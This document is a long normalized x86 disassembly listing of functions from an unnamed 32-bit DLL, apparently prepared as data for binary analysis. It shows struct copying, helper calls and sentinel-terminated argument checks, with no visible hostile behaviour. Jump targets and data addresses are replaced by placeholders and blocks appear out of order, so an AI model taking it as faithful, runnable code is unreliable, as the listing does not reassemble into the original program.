cmp eax 0x2
jne r-xdata
mov edx [ edi + 0x18 ]
mov [ esi + 0x1c ] edx
jmp r-xdata
mov edi [ ebx + 0xc ]
mov ecx [ edi ]
lea eax [ esi + 0x24 ]
mov [ esi + 0x20 ] ecx
mov edx [ edi + 0xc ]
push eax
push edx
push ebx
call sub_10004e00
xor ebx ebx
add esp 0xc
cmp [ edi + 0xc ] ebx
jbe r-xdata
mov eax [ edi + 0x18 ]
mov [ esi + 0x1c ] eax
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
lea ecx [ ecx ]
lea eax [ esi + 0x24 ]
push eax
mov eax [ edi + 0x8 ]
mov ecx [ eax + ebx * 4 ]
mov edx [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_100520a0
inc ebx
add esp 0xc
cmp ebx [ edi + 0xc ]
jb r-xdata
sub_1006c810
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
je r-xdata
cmp [ eax ] 0x2
cmp [ eax ] 0x1
jmp r-xdata
xor eax eax
mov esi [ eax + 0x18 ]
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx 0x96
je r-xdata
jne r-xdata
pop esi
pop ebp
retn
lea edx [ ebp + 0xc ]
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ edx + 0x4 ]
add edx 0x4
cmp ecx 0x96
jne r-xdata
cmp ecx esi
je r-xdata
pop esi
pop ebp
retn
sub_1006c860
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x1
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
push esi
xor esi esi
cmp ecx 0x96
je r-xdata
xor eax eax
pop ebp
retn
mov eax esi
pop esi
pop ebp
retn
lea edx [ ebp + 0xc ]
mov esi 0x1
mov ecx [ edx + 0x4 ]
add edx 0x4
cmp ecx 0x96
jne r-xdata
cmp ecx eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_1006c8b0
push ebp
mov ebp esp
cmp [ eax ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ eax + 0x1c ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax 0x1
pop ebp
retn
sub_1006c8d0
push 0x96
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push esi
call sub_1006c860
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
retn
cmp [ esi + 0x20 ] 0x2
jne r-xdata
mov eax 0x1
retn
sub_1006c900
push esi
push 0x96
push 0x2
push 0x5e
mov esi eax
push 0x5d
push esi
call sub_1006c860
add esp 0x14
test eax eax
je r-xdata
cmp [ esi ] 0x1
jne r-xdata
cmp [ esi + 0x20 ] 0x1
je r-xdata
xor eax eax
pop esi
retn
cmp [ esi + 0x1c ] 0x5b
jne r-xdata
mov eax 0x1
pop esi
retn
add esi 0x4c
push r--data
push esi
call sub_1002e6f0
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_1002e6f0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x10 ]
push eax
push r--data
call sub_10028b2b
add esp 0x8
neg eax
sbb eax eax
inc eax
jne r-xdata
mov ecx [ eax + 0x10 ]
push ecx
push r--data
call sub_10028b2b
add esp 0x8
neg eax
sbb eax eax
inc eax
je r-xdata
sub_1006c990
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
or [ ebx + 0xc ] 0x400
mov ecx [ eax + 0x8 ]
add eax 0x8
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi [ ecx ]
dec esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp esi 0x1
jle r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ecx + esi * 4 ]
mov ecx 0x5f
mov edx [ ebp + 0x8 ]
lea eax [ edi + 0x10 ]
push eax
mov [ ebx + 0x4 ] edi
mov ecx [ eax + 0x4 ]
push ebx
push edx
mov [ ebx + 0x8 ] ecx
call sub_100520a0
add esp 0xc
push eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
call sub_100520a0
add esp 0xc
dec esi
sub eax 0x4
cmp esi 0x1
jg r-xdata
cmp [ edi + 0x1c ] ecx
je r-xdata
mov edi [ eax ]
cmp [ edi ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push r--data
call sub_1001f980
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + esi * 4 - 0x4 ]
add esp 0x4
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp [ eax ] 0x1
jne r-xdata
mov edi [ ebp - 0x4 ]
mov ecx [ edi + 0x8 ]
mov edx [ eax + 0x1c ]
push ecx
push edx
call sub_1003b570
add esp 0x4
push eax
push esi
push edi
push r--data
call sub_1001f980
mov eax [ ebp - 0x4 ]
mov edi [ edi + 0x8 ]
lea esi [ eax + 0x10 ]
push esi
push edi
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov [ ebx + 0x8 ] edi
call sub_10068ab0
lea eax [ edi + 0x1 ]
add esp 0x24
cmp eax [ esi + 0x4 ]
jae r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
mov edx [ ecx + eax * 4 ]
mov [ edx + 0x8 ] eax
inc eax
cmp eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1006caa0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi [ edi + 0xc ]
mov [ ebp - 0x8 ] esi
add esi 0x48
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x1c ]
push ebx
push 0x58
push edi
mov [ ebp - 0x4 ] eax
call sub_10024af0
mov ecx [ ebp - 0x4 ]
mov ebx eax
xor eax eax
push esi
push edi
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0xffffffff
mov [ ebx ] ecx
mov [ ebx + 0xc ] eax
call sub_100690f0
mov [ ebx + 0x10 ] eax
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x14 ] edx
mov ecx [ eax + 0x68 ]
mov edx [ ecx + 0x10 ]
sub edx [ esi + 0xc ]
add esp 0x10
mov [ ebx + 0x18 ] edx
mov ecx [ esi + 0x10 ]
mov [ ebx + 0x1c ] ecx
mov edx [ esi + 0x14 ]
mov [ ebx + 0x20 ] edx
mov ecx [ esi + 0x18 ]
mov [ ebx + 0x24 ] ecx
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push ecx
call sub_1006c860
add esp 0x1c
test eax eax
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + ecx * 4 - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_1006c990
add esp 0x4
jmp r-xdata
lea ecx [ eax + 0x10 ]
push ecx
mov [ ebx + 0x4 ] eax
mov edx [ ecx + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] edx
call sub_100520a0
add esp 0xc
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
push eax
push ecx
push r--data
call sub_1001f980
push esi
push edi
call sub_1001bc80
push esi
push edi
call sub_1001c570
add esp 0x1c
mov [ esi + 0x1c ] 0x5
pop ebx
sub_1006cbc0
mov edx [ eax + 0x4 ]
mov [ ecx + 0x30 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x34 ] edx
mov edx [ eax + 0xc ]
mov [ ecx + 0x38 ] edx
cmp [ eax ] 0x2
jne r-xdata
mov eax r--data
mov edx [ eax ]
mov [ ecx + 0x1c ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x20 ] eax
retn
mov edx [ eax + 0x10 ]
add eax 0x10
mov [ ecx + 0x1c ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x20 ] eax
retn
sub_1006cc00
push esi
push edi
mov edi eax
mov esi [ edi + 0xc ]
call sub_1006caa0
cmp [ esi + 0xc ] 0x0
jbe r-xdata
lea edx [ esi + 0x8 ]
push edx
push edi
call sub_10053700
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov edi [ eax ]
cmp edi 0x1
jne r-xdata
pop edi
pop esi
retn
mov ecx [ ecx + 0x1c ]
push ecx
call sub_1003b570
push eax
push r--data
call sub_1001f980
add esp 0xc
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
xor edx edx
mov ecx [ eax + 0x1c ]
cmp ecx 0xa
jne r-xdata
test edx edx
jne r-xdata
cmp edi 0x1
jne r-xdata
test ecx ecx
jne r-xdata
cmp [ esi + 0x6c ] 0x0
jne r-xdata
pop edi
pop esi
retn
or [ eax + 0xc ] 0x2
jmp r-xdata
mov edi [ eax + 0x1c ]
cmp edi [ ecx + 0x18 ]
je r-xdata
cmp [ esi + 0x70 ] ecx
je r-xdata
mov edx 0x1
jmp r-xdata
mov ecx [ esi + 0x68 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x40 ] edx
mov edx [ ecx + 0x8 ]
mov [ eax + 0x44 ] edx
mov edx [ ecx + 0xc ]
mov [ eax + 0x48 ] edx
cmp [ ecx ] 0x2
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ esi + 0x68 ]
cmp [ ecx ] 0x2
jne r-xdata
mov ecx r--data
mov edx [ ecx ]
mov [ eax + 0x2c ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x30 ] ecx
mov edx [ ecx + 0x10 ]
add ecx 0x10
mov [ eax + 0x2c ] edx
mov ecx [ ecx + 0x4 ]
pop edi
mov [ eax + 0x30 ] ecx
pop esi
retn
sub_1006cce0
push edi
mov edi eax
call sub_1006caa0
push 0x58
push edi
call sub_10024af0
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xffffffff
mov [ eax + 0xc ] ecx
mov [ eax ] 0x4
mov ecx [ esi + 0x18 ]
mov [ eax + 0x10 ] ecx
mov edx [ esi + 0x10 ]
mov [ eax + 0x14 ] edx
mov ecx [ esi + 0x14 ]
mov [ eax + 0x18 ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x1c ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ esi + 0xc ]
mov [ eax + 0x24 ] ecx
add esp 0x8
lea ecx [ ebx + 0x10 ]
push ecx
mov [ eax + 0x4 ] ebx
mov edx [ ecx + 0x4 ]
push eax
push edi
mov [ eax + 0x8 ] edx
call sub_100520a0
add esp 0xc
pop edi
retn
sub_1006cd50
push 0x96
push 0x66
push 0x0
mov eax esi
call sub_1006c550
push eax
call sub_1006c860
add esp 0x10
test eax eax
jne r-xdata
retn
lea ecx [ ecx ]
mov eax esi
call sub_1006cc00
push 0x96
push 0x66
push 0x0
mov eax esi
call sub_1006c550
push eax
call sub_1006c860
add esp 0x10
test eax eax
je r-xdata
sub_1006cda0
push 0x96
push 0x5f
push 0x0
mov eax esi
call sub_1006c550
push eax
call sub_1006c860
add esp 0x10
test eax eax
jne r-xdata
retn
lea ecx [ ecx ]
mov eax esi
call sub_1006cc00
push 0x96
push 0x5f
push 0x0
mov eax esi
call sub_1006c550
push eax
call sub_1006c860
add esp 0x10
test eax eax
je r-xdata
sub_1006cdf0
push ebp
mov ebp esp
push esi
push edi
push 0x58
push ebx
call sub_10024af0
mov edi eax
lea esi [ edi + 0x10 ]
push esi
xor eax eax
push 0x1
push ebx
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0xffffffff
mov [ edi ] 0x1
mov [ edi + 0xc ] eax
call sub_10004e00
lea eax [ esi + 0x3c ]
push eax
push 0x0
push ebx
call sub_10004e00
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] 0x0
mov edx [ r--data ]
mov [ esi + 0x14 ] edx
mov eax [ r--data ]
mov [ esi + 0x18 ] eax
mov ecx [ r--data ]
mov [ esi + 0x1c ] ecx
mov edx [ r--data ]
mov [ esi + 0x20 ] edx
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x68 ]
mov ecx [ eax + 0x4 ]
mov [ esi + 0x24 ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x28 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x2c ] eax
mov ecx [ r--data ]
mov [ esi + 0x30 ] ecx
mov edx [ r--data ]
mov [ esi + 0x34 ] edx
mov eax [ r--data ]
add esp 0x20
mov [ esi + 0x38 ] eax
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_1006cea0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push 0x58
push eax
call sub_10024af0
mov ecx [ ebp + 0x8 ]
mov ebx eax
lea esi [ ebx + 0x10 ]
push esi
xor eax eax
push 0x1
push ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0xffffffff
mov [ ebx ] 0x1
mov [ ebx + 0xc ] eax
call sub_10004e00
mov edx [ edi + 0x1c ]
mov [ esi + 0x3c ] edx
mov eax [ edi + 0x20 ]
mov [ esi + 0x40 ] eax
mov ecx [ edi + 0x24 ]
mov eax [ ebp + 0xc ]
mov [ esi + 0x44 ] ecx
mov edx [ edi + 0x18 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0xc ] edx
mov ecx [ edi + 0x10 ]
mov [ esi + 0x14 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x18 ] edx
mov eax [ edi + 0x4 ]
mov [ esi + 0x24 ] eax
mov ecx [ edi + 0x8 ]
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0x2c ] edx
mov eax [ r--data ]
mov [ esi + 0x1c ] eax
mov ecx [ r--data ]
mov [ esi + 0x20 ] ecx
mov edx [ r--data ]
mov [ esi + 0x30 ] edx
mov eax [ r--data ]
mov [ esi + 0x34 ] eax
mov ecx [ r--data ]
mov [ esi + 0x38 ] ecx
mov edx [ r--data ]
mov [ edi + 0x1c ] edx
mov eax [ r--data ]
add esp 0x14
mov [ edi + 0x20 ] eax
mov ecx [ r--data ]
pop esi
mov eax ebx
mov [ edi + 0x24 ] ecx
pop ebx
pop ebp
retn
sub_1006cf60
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi [ edi + 0xc ]
mov ebx eax
jne r-xdata
cmp [ esi + 0x44 ] 0x0
je r-xdata
call sub_1006caa0
mov eax [ edi + 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push ecx
call sub_1006c860
add esp 0x1c
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ edx + ecx * 4 - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_1006c990
add esi 0x8
push esi
push ebx
push edi
call sub_100520a0
add esp 0x10
pop edi
pop esi
pop ebx
pop ebp
retn
lea ecx [ eax + 0x10 ]
push ecx
mov [ ebx + 0x4 ] eax
mov eax [ ecx + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] eax
call sub_100520a0
add esi 0x8
push esi
push ebx
push edi
call sub_100520a0
add esp 0x18
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1006d010
push esi
push 0x0
push ebx
call sub_1006cea0
push 0x0
mov ecx ebx
mov esi eax
call sub_1006cf60
mov eax [ esi + 0x1c ]
add esp 0xc
push esi
push eax
call sub_1003b570
add esp 0x4
push eax
push r--data
call sub_1001f980
add esp 0xc
mov eax esi
pop esi
retn
sub_1006d050
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
push eax
call sub_1006cdf0
mov esi eax
or edi 0x1
or [ esi + 0xc ] edi
push 0x0
mov ecx ebx
call sub_1006cf60
mov ecx [ ebp + 0x8 ]
add esp 0x8
push esi
push ecx
call sub_1003b570
add esp 0x4
push eax
push r--data
call sub_1001f980
add esp 0xc
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_1006d0a0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi eax
mov eax [ ebp + 0x8 ]
push esi
push eax
mov edi ebx
call sub_1006cea0
mov ecx [ ebp + 0x8 ]
push 0x0
mov [ ebp - 0x4 ] eax
call sub_1006cf60
lea edi [ ebx + 0x1c ]
push r--data
push edi
call sub_1002e6f0
add esp 0x14
test eax eax
je r-xdata
push r--data
push edi
call sub_1002e6f0
add esp 0x8
test eax eax
je r-xdata
mov esi [ esi * 4 + rw-data ]
push r--data
push edi
call sub_1002e6f0
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push r--data
push edi
call sub_1002e6f0
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_1006c750
add esp 0x4
mov ecx [ eax + 0x10 ]
mov eax esi
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_1006c750
add esp 0x4
mov ecx [ eax + 0x10 ]
mov eax r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_1006d1b0
push esi
mov esi [ eax + 0xc ]
add esi 0x48
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ edi + 0x18 ]
push esi
push ecx
push eax
call sub_10062120
add esp 0xc
cmp [ edi ] 0x5
jne r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0xc ] ecx
mov edx [ edi + 0x4 ]
mov [ esi + 0x10 ] edx
mov ecx [ edi + 0x8 ]
mov [ esi + 0x14 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0x18 ] edx
mov edx [ edi + 0x18 ]
push edx
push r--data
call sub_1001f980
add esp 0x8
pop esi
retn
mov [ esi + 0x1c ] 0x2
sub_1006d210
push ebp
mov ebp esp
push edi
push 0x0
push esi
mov edi eax
call sub_1006cea0
push 0x0
mov ecx esi
mov edi eax
call sub_1006cf60
mov eax [ edi + 0x1c ]
add esp 0xc
push edi
push eax
call sub_1003b570
add esp 0x4
push eax
push r--data
call sub_1001f980
mov ecx [ ebp + 0x8 ]
push ecx
push esi
call sub_100620b0
mov eax [ esi + 0xc ]
mov edx [ eax ]
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xc ]
add esp 0x14
mov [ eax ] 0x7
pop edi
pop ebp
retn
sub_1006d270
push ebp
mov ebp esp
mov ecx [ eax + 0xc ]
mov eax [ ecx + 0x18 ]
dec eax
js r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ecx + 0x14 ]
lea edx [ ecx + eax * 4 ]
cmp [ ecx ] 0x1
jne r-xdata
sub edx 0x4
dec eax
jns r-xdata
cmp [ ecx + 0x1c ] 0x27
je r-xdata
mov ecx [ edx ]
cmp ecx r--data
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax 0x1
pop ebp
retn
sub_1006d2b0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ eax + 0xc ]
mov esi [ edi + 0x18 ]
xor eax eax
dec esi
mov [ ebp - 0x4 ] eax
js r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov eax [ ebp - 0x4 ]
pop ebx
cmp [ eax ] 0x1
jne r-xdata
dec esi
jns r-xdata
mov edx [ eax + 0x1c ]
mov ecx [ ebp + 0x8 ]
cmp edx [ ecx + 0x1c ]
jne r-xdata
mov ecx [ edi + 0x14 ]
mov eax [ ecx + esi * 4 ]
cmp eax r--data
je r-xdata
mov edx [ eax + 0x20 ]
cmp edx [ ecx + 0x20 ]
jne r-xdata
add ecx 0x4c
push ecx
lea ebx [ eax + 0x4c ]
call sub_1006c3d0
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
inc [ ebp - 0x4 ]
mov [ eax ] esi
sub_1006d320
push ebp
mov ebp esp
push ecx
push esi
mov esi [ edi + 0xc ]
add esi 0x14
cmp ebx r--data
jne r-xdata
push r--data
push r--data
jmp r-xdata
push esi
push ebx
push edi
call sub_100520a0
add esp 0xc
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
push edx
push r--data
call sub_1001f980
mov eax [ ebp - 0x4 ]
push esi
push eax
push edi
call sub_10015200
add esp 0x14
call sub_1001f980
mov eax [ esi + 0x4 ]
add esp 0x4
lea ecx [ ebp - 0x4 ]
push ecx
mov [ ebp - 0x4 ] eax
push ebx
mov eax edi
call sub_1006d2b0
add esp 0x8
cmp eax 0x3
jl r-xdata
sub_1006d390
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ eax + 0xc ]
push esi
mov esi [ ebx + 0x18 ]
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x14 ]
dec esi
lea ecx [ ecx + esi * 4 ]
push edi
mov edi [ ecx ]
mov [ ebp - 0x4 ] ecx
cmp edi r--data
je r-xdata
pop edi
mov edx [ ebx + 0xc ]
xor eax eax
test edx edx
je r-xdata
test esi esi
je r-xdata
mov ecx [ ebx + 0x8 ]
lea esp [ esp ]
or esi 0xffffffff
mov edi [ ecx - 0x4 ]
sub ecx 0x4
dec esi
mov [ ebp - 0x4 ] ecx
cmp edi r--data
je r-xdata
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
mov eax [ eax + 0x1c ]
push eax
call sub_1003b570
push eax
push esi
push r--data
call sub_1001f980
add esp 0x10
cmp esi [ ebx + 0x18 ]
jae r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov eax [ ebx + 0xc ]
inc esi
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
xor eax eax
test edx edx
je r-xdata
cmp [ ecx ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ ebx + 0x14 ]
mov eax [ ecx + esi * 4 ]
mov edx [ ebp + 0x8 ]
push 0x80
push eax
push edx
call sub_100283e0
mov ecx [ ebp + 0x8 ]
push 0x1
mov edi eax
call sub_1006cf60
mov eax [ ebx + 0x14 ]
add esp 0x10
mov [ eax + esi * 4 ] edi
mov ecx [ edi + 0x1c ]
push esi
push ecx
call sub_1003b570
add esp 0x4
push eax
push r--data
call sub_1001f980
inc esi
add esp 0xc
cmp esi [ ebx + 0x18 ]
jb r-xdata
mov ecx [ ebx + 0x8 ]
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
cmp [ ecx ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
sub_1006d4a0
push esi
mov esi [ ebx + 0xc ]
push edi
add esi 0x14
xor edi edi
lea ebx [ ebx ]
push edi
push r--data
call sub_1001f980
add esp 0x8
pop edi
pop esi
retn
cmp eax r--data
jne r-xdata
push esi
push ebx
call sub_10053700
add esp 0x8
inc edi
test eax eax
je r-xdata
sub_1006d4e0
cmp [ esi + 0xc ] 0x0
push ebx
push edi
jne r-xdata
pop edi
mov eax 0x1
pop ebx
retn
mov eax [ esi ]
mov ecx r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_1006c570
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov edi [ esi + 0x4 ]
lea ebx [ eax + 0x1 ]
mov eax r--data
call sub_1006c570
test eax eax
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov edi [ esi + 0x8 ]
mov eax r--data
call sub_1006c570
test eax eax
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_1006c570
test eax eax
je r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_1006c570
test eax eax
jne r-xdata
cmp [ esi + 0x14 ] ebx
je r-xdata
pop edi
mov eax 0x2
pop ebx
retn
mov edi [ esi + 0x4 ]
mov eax r--data
call sub_1006c570
test eax eax
je r-xdata
pop edi
xor eax eax
pop ebx
retn
cmp [ esi + 0x14 ] ebx
jne r-xdata
sub_1006d5b0
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebx + 0xc ]
push edi
lea eax [ ebp - 0x14 ]
push eax
push 0xa
push ebx
call sub_10004e00
mov eax [ ebp + 0x14 ]
add esp 0xc
cmp eax 0x96
je r-xdata
mov edi [ esi + 0xc ]
dec edi
mov [ ebp - 0x8 ] 0x0
js r-xdata
lea edi [ ebp + 0x14 ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_1005fce0
mov eax [ ebp - 0x8 ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0x8 ]
mov ebx [ ebp - 0x10 ]
lea eax [ edx + edi * 4 ]
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x14 ]
push ecx
push eax
push ebx
call sub_100520a0
mov eax [ edi + 0x4 ]
add edi 0x4
add esp 0xc
cmp eax 0x96
jne r-xdata
sub [ ebp - 0x4 ] 0x4
dec edi
jns r-xdata
mov edx [ ebp + 0xc ]
mov esi [ eax + 0x1c ]
mov ecx [ edx + 0x4 ]
xor eax eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
cmp [ eax ] 0x1
jne r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
test ebx ebx
je r-xdata
mov edx [ edx ]
nop
mov ebx [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp [ edx + eax * 4 ] esi
je r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc eax
add edx 0x4
cmp eax ecx
jb r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx 0x1
inc eax
cmp eax ebx
jb r-xdata
cmp esi [ edx ]
je r-xdata
jmp r-xdata
sub_1006d690
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_1006d5b0
add esp 0x54
mov esp ebp
pop ebp
retn
sub_1006d6f0
mov eax [ eax + 0xc ]
push esi
mov esi [ eax + 0xc ]
dec esi
push edi
js r-xdata
pop edi
xor eax eax
pop esi
retn
mov ecx [ eax + 0x8 ]
lea edi [ ecx + esi * 4 ]
pop edi
mov eax 0x1
pop esi
retn
cmp [ eax ] 0x1
jne r-xdata
sub edi 0x4
dec esi
jns r-xdata
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
push 0x7c
push eax
call sub_1006c860
add esp 0x4c
test eax eax
jne r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_1006d760
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0xc ]
push eax
push 0x6
push esi
call sub_10004e00
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax 0x96
je r-xdata
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
